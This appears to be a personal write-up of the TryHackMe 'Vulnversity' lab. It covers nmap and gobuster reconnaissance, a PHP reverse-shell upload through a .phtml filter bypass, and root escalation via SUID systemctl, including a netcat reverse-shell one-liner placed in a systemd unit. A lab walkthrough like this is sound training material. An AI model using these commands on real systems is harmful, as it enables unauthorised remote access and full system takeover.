---
layout: default
title: VULNVERSITY
description: by TRY HACK ME
---

<h3 align="center">
This is the first path in to learning when jumping on the THM platform.
</h3>

# Vulnversity

1. Deploy the machine should be straight forward
2. For the recon level, I just used
   ```
   nmap 10.10.181.14 -A -T4
   ```
   also had to see the -h switch to find out what -n does not do
3. Locating directories with Gobuster

   ```
   gobuster dir -u http://10.10.91.9:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

   ===============================================================
   Gobuster v3.1.0
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://10.10.91.9:3333
   [+] Method:                  GET
   [+] Threads:                 10
   [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.1.0
   [+] Timeout:                 10s
   ===============================================================
   2021/11/26 11:51:54 Starting gobuster in directory enumeration mode
   ===============================================================
   /images               (Status: 301) [Size: 316] [--> http://10.10.91.9:3333/images/]
   /css                  (Status: 301) [Size: 313] [--> http://10.10.91.9:3333/css/]
   /js                   (Status: 301) [Size: 312] [--> http://10.10.91.9:3333/js/]
   /fonts                (Status: 301) [Size: 315] [--> http://10.10.91.9:3333/fonts/]
   /internal             (Status: 301) [Size: 318] [--> http://10.10.91.9:3333/internal/]
   /server-status        (Status: 403) [Size: 300]
   Progress: 112157 / 220561 (50.85%)
   ```

   /internal/ is where the upload form is located.

4. Comprimise the browser
   - basically just did what the instructions said and found the .phtml is the allowed file.
   - copied the raw code from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php and saved it as reverse-shell.phtml
   - uploaded the file into the /internal/ page
   - started a listener with netcat
   - then went to http://10.10.91.9:3333/internal/uploads/reverse-shell.phtml
   - we got a user shell from here and got the user flag
5. Privilege Escalation

   - Google what SUID does and found out that there a binary exploit for it.
   - https://gtfobins.github.io/gtfobins/systemctl/
   - https://www.youtube.com/watch?v=WgTL7KM44YQ
   - so here is the next steps I did copying the code from gtfobins
   - started another listener on port 3000
     ```
     nc -nvlp 3000
     ```
   - then

     ```
     TF=$(mktemp).service
     ```

     ```
     echo '[Service]
     ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.54.166 3000 >/tmp/f"
     [Install]
     WantedBy=multiuser.target' >$TF

     /bin/systemctl link $TF

     /bin/systemctl enable --now $TF
     ```

     ```
     /bin/systemctl link $TF
     ```

     ```
     /bin/systemctl enable --now $TF
     ```

   - after the last command script my other listener has activated...
   - from there you'd just need to go to /root/ to find the root flag

<br><br><br>

# Reference

1. https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
2. https://gtfobins.github.io/gtfobins/systemctl
3. https://www.youtube.com/watch?v=WgTL7KM44YQ
4. https://www.youtube.com/watch?v=nC9D1ES-nmo

<br><br>

[back to HOME](./)
